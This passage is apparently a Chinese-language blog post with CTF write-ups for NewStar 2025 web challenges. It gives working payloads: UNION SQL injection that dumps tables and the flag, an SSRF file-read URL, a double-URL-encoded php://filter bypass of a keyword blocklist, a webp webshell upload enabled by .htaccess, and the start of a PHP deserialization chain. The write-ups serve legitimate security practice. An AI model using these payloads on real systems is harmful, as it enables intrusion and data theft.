+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>aUNION<span class="operator">%</span><span class="number">0</span>aselect<span class="operator">%</span><span class="number">0</span>a<span class="operator">*</span><span class="operator">%</span><span class="number">0</span>afrom<span class="operator">%</span><span class="number">0</span>a((<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>agroup_concat(name)<span class="operator">%</span><span class="number">0</span>afrom<span class="operator">%</span><span class="number">0</span>asqlite_master)A<span class="operator">%</span><span class="number">0</span>ajoin<span class="operator">%</span><span class="number">0</span>a(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>a2)b<span class="operator">%</span><span class="number">0</span>ajoin<span class="operator">%</span><span class="number">0</span>a(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>a3)C<span class="operator">%</span><span class="number">0</span>ajoin<span class="operator">%</span><span class="number">0</span>a(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>a4)D<span class="operator">%</span><span class="number">0</span>ajoin<span class="operator">%</span><span class="number">0</span>a(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>a5)E)</span><br></pre></td></tr></table></figure></div>
+
+<p>得到所有的表名</p>
+<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;cpu&quot;</span><span class="punctuation">:</span><span class="string">&quot;23%&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ram&quot;</span><span class="punctuation">:</span><span class="string">&quot;45%&quot;</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;Online&quot;</span><span class="punctuation">,</span><span class="attr">&quot;lastChecked&quot;</span><span class="punctuation">:</span><span class="string">&quot;2025-12-03 12:24:30&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="string">&quot;node_status,sys_config,sqlite_autoindex_sys_config_1,sqlite_sequence&quot;</span><span class="punctuation">,</span><span class="attr">&quot;cpu&quot;</span><span class="punctuation">:</span><span class="number">2</span><span class="punctuation">,</span><span class="attr">&quot;ram&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">,</span><span class="attr">&quot;lastChecked&quot;</span><span class="punctuation">:</span><span class="number">5</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>所有表名：node_status,sys_config,sqlite_autoindex_sys_config_1,sqlite_sequence</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>aUNION<span class="operator">%</span><span class="number">0</span>aselect<span class="operator">%</span><span class="number">0</span>a<span class="operator">*</span><span class="operator">%</span><span class="number">0</span>afrom<span class="operator">%</span><span class="number">0</span>a((<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>agroup_concat(config_value)<span class="operator">%</span><span class="number">0</span>afrom<span class="operator">%</span><span class="number">0</span>asys_config)A<span class="operator">%</span><span class="number">0</span>ajoin<span class="operator">%</span><span class="number">0</span>a(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>a2)b<span class="operator">%</span><span class="number">0</span>ajoin<span class="operator">%</span><span class="number">0</span>a(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>a3)C<span class="operator">%</span><span class="number">0</span>ajoin<span class="operator">%</span><span class="number">0</span>a(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>a4)D<span class="operator">%</span><span class="number">0</span>ajoin<span class="operator">%</span><span class="number">0</span>a(<span class="keyword">select</span><span class="operator">%</span><span class="number">0</span>a5)E)</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;cpu&quot;</span><span class="punctuation">:</span><span class="string">&quot;23%&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ram&quot;</span><span class="punctuation">:</span><span class="string">&quot;45%&quot;</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;Online&quot;</span><span class="punctuation">,</span><span class="attr">&quot;lastChecked&quot;</span><span class="punctuation">:</span><span class="string">&quot;2025-12-03 12:24:30&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="string">&quot;flag&#123;5c1e28fe-131d-541b-4ff2-835c10403d68&#125;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;cpu&quot;</span><span class="punctuation">:</span><span class="number">2</span><span class="punctuation">,</span><span class="attr">&quot;ram&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">,</span><span class="attr">&quot;lastChecked&quot;</span><span class="punctuation">:</span><span class="number">5</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>得到flag</p>
+<h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><p>ssrf</p>
+<h2 id="mygo"><a href="#mygo" class="headerlink" title="mygo"></a>mygo</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../../note/ctfwp/newstar2025_web/mygo.png"
+                     
+                ></p>
+<p>请求到了flag.php的内容。</p>
+<p>接着直接file:&#x2F;&#x2F;读flag</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../../note/ctfwp/newstar2025_web/mygo2.png"
+                     
+                ></p>
+<p>payload：</p>
+<div class="code-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?proxy=http://127.0.0.1/flag.php?soyorin=file:///flag</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="mirror-gate"><a href="#mirror-gate" class="headerlink" title="mirror_gate"></a>mirror_gate</h2><p>文件上传题</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- flag is <span class="keyword">in</span> flag.<span class="property">php</span> --&gt;</span><br><span class="line">    &lt;!-- <span class="attr">HINT</span>: c29tZXRoaW5nX2lzX2luXy91cGxvYWRzLw== --&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>大无语，做题的时候没看到这个提示，呜呜呜呜呜呜呜呜呜呜呜呜呜呜T_T……….</p>
+<p>base64解码：something_is_in_&#x2F;uploads&#x2F;</p>
+<p>那么就去看看，直接访问403了，存在该目录。</p>
+<p>接着目录爆破一下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../../note/ctfwp/newstar2025_web/mirrogate.png"
+                     
+                ></p>
+<p>扫到了.htaccess</p>
+<p>访问：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .webp</span><br></pre></td></tr></table></figure></div>
+
+<p>配置将webp文件解析为php文件</p>
+<p>接下来就好进行文件上传了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../../note/ctfwp/newstar2025_web/mirrorgate3.png"
+                     
+                ></p>
+<p>（注：要在实在的webp文件中添加命令执行代码）</p>
+<p>最后访问即可在环境变量中获得flag。</p>
+<h2 id="小E的秘密计划"><a href="#小E的秘密计划" class="headerlink" title="小E的秘密计划"></a>小E的秘密计划</h2><p>进入后题目提示：先找到网站备份文件</p>
+<p>目录扫描一下，果然找到了<a class="link"   target="_blank" rel="noopener" href="http://www.zip/" >www.zip<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>下载下来发现目录&#x2F;public-555edc76-9621-4997-86b9-01483a50293e</p>
+<p>随便登录一下，登录失败，题目又提示，在git里找吧，好，我们就去git里找。</p>
+<h2 id="ez-clain"><a href="#ez-clain" class="headerlink" title="ez_clain"></a>ez_clain</h2><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$waf</span> = <span class="keyword">array</span>(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;base64&#x27;</span>,<span class="string">&#x27;data&#x27;</span>,<span class="string">&#x27;zip&#x27;</span>,<span class="string">&#x27;rar&#x27;</span>,<span class="string">&#x27;filter&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$waf</span> <span class="keyword">as</span> <span class="variable">$waf_word</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$file</span>, <span class="variable">$waf_word</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;waf:&quot;</span>.<span class="variable">$waf_word</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_output</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$waf</span> = <span class="keyword">array</span>(<span class="string">&#x27;f&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$waf</span> <span class="keyword">as</span> <span class="variable">$waf_word</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$data</span>, <span class="variable">$waf_word</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;waf:&quot;</span>.<span class="variable">$waf_word</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="variable">$decoded</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$decoded</span> === <span class="literal">false</span> || <span class="variable">$decoded</span> === <span class="variable">$data</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$decoded</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$waf</span> <span class="keyword">as</span> <span class="variable">$waf_word</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$data</span>, <span class="variable">$waf_word</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;waf:&quot;</span>.<span class="variable">$waf_word</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>) !== <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">filter_output</span>(<span class="variable">$data</span>) !== <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>ban了这些东西：’&#x2F;‘,’:’,’php’,’base64’,’data’,’zip’,’rar’,’filter’,’flag’</p>
+<p>并且对输出有限制：过滤了f</p>
+<blockquote>
+<p>php:&#x2F;&#x2F;filter&#x2F;string.rot13&#x2F;resource&#x3D;&#x2F;flag</p>
+</blockquote>
+<p>$file &#x3D; urldecode($file);</p>
+<p>进行双重url编码</p>
+<p>payload：</p>
+<div class="code-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%33%25%37%34%25%37%32%25%36%39%25%36%45%25%36%37%25%32%45%25%37%32%25%36%46%25%37%34%25%33%31%25%33%33%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%32%46%25%36%36%25%36%43%25%36%31%25%36%37</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="who’ssti"><a href="#who’ssti" class="headerlink" title="who’ssti"></a><strong>who’ssti</strong></h2><p>ssti</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify, request, render_template_string, render_template</span><br><span class="line"><span class="keyword">import</span> sys, random</span><br><span class="line"></span><br><span class="line">func_List = [<span class="string">&quot;get_close_matches&quot;</span>, <span class="string">&quot;dedent&quot;</span>, <span class="string">&quot;fmean&quot;</span>, </span><br><span class="line">             <span class="string">&quot;listdir&quot;</span>, <span class="string">&quot;search&quot;</span>, <span class="string">&quot;randint&quot;</span>, <span class="string">&quot;load&quot;</span>, <span class="string">&quot;sum&quot;</span>, </span><br><span class="line">             <span class="string">&quot;findall&quot;</span>, <span class="string">&quot;mean&quot;</span>, <span class="string">&quot;choice&quot;</span>]</span><br><span class="line">need_List = random.sample(func_List, <span class="number">5</span>)</span><br><span class="line">need_List = <span class="built_in">dict</span>.fromkeys(need_List, <span class="number">0</span>)</span><br><span class="line">BoleanFlag = <span class="literal">False</span></span><br><span class="line">RealFlag = <span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).environ.get(<span class="string">&quot;ICQ_FLAG&quot;</span>, <span class="string">&quot;flag&#123;test_flag&#125;&quot;</span>)</span><br><span class="line"><span class="comment"># 清除 ICQ_FLAG</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).environ[<span class="string">&quot;ICQ_FLAG&quot;</span>] = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trace_calls</span>(<span class="params">frame, event, arg</span>):</span><br><span class="line">  <span class="keyword">if</span> event == <span class="string">&#x27;call&#x27;</span>:</span><br><span class="line">    func_name = frame.f_code.co_name</span><br><span class="line">    <span class="comment"># print(func_name)</span></span><br><span class="line">    <span class="keyword">if</span> func_name <span class="keyword">in</span> need_List:</span><br><span class="line">      need_List[func_name] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">all</span>(need_List.values()):</span><br><span class="line">      <span class="keyword">global</span> BoleanFlag</span><br><span class="line">      BoleanFlag = <span class="literal">True</span></span><br><span class="line">  <span class="keyword">return</span> trace_calls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">  submit = request.form.get(<span class="string">&#x27;submit&#x27;</span>)</span><br><span class="line">  <span class="keyword">if</span> submit:</span><br><span class="line">    sys.settrace(trace_calls)</span><br><span class="line">    <span class="built_in">print</span>(render_template_string(submit))</span><br><span class="line">    sys.settrace(<span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> BoleanFlag:</span><br><span class="line">      <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;flag&quot;</span>: RealFlag&#125;)</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;OK&quot;</span>&#125;)</span><br><span class="line">  <span class="keyword">return</span> render_template_string(<span class="string">&#x27;&#x27;&#x27;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh-cn&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;首页&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;提交你的代码，让后端看看你的厉害！&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;/&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;label for=&quot;submit&quot;&gt;提交一下：&lt;/label&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; id=&quot;submit&quot; name=&quot;submit&quot; required&gt;</span></span><br><span class="line"><span class="string">        &lt;button type=&quot;submit&quot;&gt;提交&lt;/button&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;div style=&quot;margin-top: 20px;&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt; 尝试调用到这些函数！ &lt;/p&gt;</span></span><br><span class="line"><span class="string">    &#123;% for func in funcList %&#125;</span></span><br><span class="line"><span class="string">        &lt;p&gt;&#123;&#123; func &#125;&#125;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &#123;% endfor %&#125;</span></span><br><span class="line"><span class="string">    &lt;div style=&quot;margin-top: 20px; color: red;&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt; 你目前已经调用了 &#123;&#123; called_funcs|length &#125;&#125; 个函数：&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;ul&gt;</span></span><br><span class="line"><span class="string">        &#123;% for func in called_funcs %&#125;</span></span><br><span class="line"><span class="string">            &lt;li&gt;&#123;&#123; func &#125;&#125;&lt;/li&gt;</span></span><br><span class="line"><span class="string">        &#123;% endfor %&#125;</span></span><br><span class="line"><span class="string">        &lt;/ul&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                &#x27;&#x27;&#x27;</span></span><br><span class="line">                                , </span><br><span class="line">                                funcList = need_List, called_funcs = [func <span class="keyword">for</span> func, called <span class="keyword">in</span> need_List.items() <span class="keyword">if</span> called])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+<h1 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h1><h2 id="小羊走迷宫"><a href="#小羊走迷宫" class="headerlink" title="小羊走迷宫"></a><strong>小羊走迷宫</strong></h2><p>死在传参上了</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/shao65308/article/details/134312064" >php get或post变量名中非法字符转化规则_php非法字符-CSDN博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">startPoint</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$direction</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;gogogo出发咯 &quot;</span>;</span><br><span class="line">        <span class="variable">$way</span> = <span class="variable language_">$this</span>-&gt;direction;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$way</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Treasure</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$door</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chest</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;拿到钥匙咯，开门！ &quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; door -&gt; <span class="title function_ invoke__">open</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;小羊真可爱! &quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; chest -&gt; key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SaySomething</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;说点什么呢 &quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;说： &quot;</span>.<span class="variable language_">$this</span>-&gt;sth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">endPoint</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;到达终点！现在尝试获取flag吧&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span> = <span class="keyword">new</span> <span class="title function_ invoke__">startPoint</span>();</span><br><span class="line"><span class="variable">$say</span> = <span class="keyword">new</span> <span class="title class_">SaySomething</span>();</span><br><span class="line"><span class="variable">$treasure</span> = <span class="keyword">new</span> <span class="title class_">Treasure</span>();</span><br><span class="line"><span class="variable">$end</span> = <span class="keyword">new</span> <span class="title function_ invoke__">endPoint</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 建立引用关系（与之前分析一致）</span></span><br><span class="line"><span class="variable">$end</span>-&gt;path = <span class="string">&#x27;flag.php&#x27;</span>;   <span class="comment">// 目标文件，根据实际情况修改</span></span><br><span class="line"><span 